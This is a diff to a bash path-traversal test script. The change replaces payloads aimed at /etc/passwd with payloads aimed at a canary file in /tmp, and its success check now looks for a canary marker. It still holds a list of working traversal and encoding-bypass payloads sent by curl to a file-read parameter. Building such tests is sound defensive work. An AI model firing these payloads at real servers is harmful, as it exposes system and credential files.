@@ -9,19 +9,19 @@ BASE="http://${TARGET_HOST}:${TARGET_PORT}/read"
 SUCCESS=1
 
 payloads=(
-  '../../etc/passwd'
-  '../../../etc/passwd'
-  '....//....//etc/passwd'
-  '..%2f..%2f..%2fetc%2fpasswd'
-  '%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-  '/etc/passwd'
+  '../../tmp/path_canary.txt'
+  '../../../tmp/path_canary.txt'
+  '....//....//tmp/path_canary.txt'
+  '..%2f..%2f..%2ftmp%2fpath_canary.txt'
+  '%2e%2e/%2e%2e/%2e%2e/tmp/path_canary.txt'
+  '/tmp/path_canary.txt'
 )
 
 echo "---raw---"
 for i in "${!payloads[@]}"; do
   p="${payloads[$i]}"
   resp=$(curl -sS --max-time 4 "${BASE}?name=${p}" 2>&1) || true
-  if echo "$resp" | grep -qE 'root:x:|root:.*:0:0'; then
+  if echo "$resp" | grep -qF 'CANARY_PATH_5c9e0a'; then
     echo "PAYLOAD[$i] TRAVERSAL_SUCCESS: ${p}"
     SUCCESS=0
   else
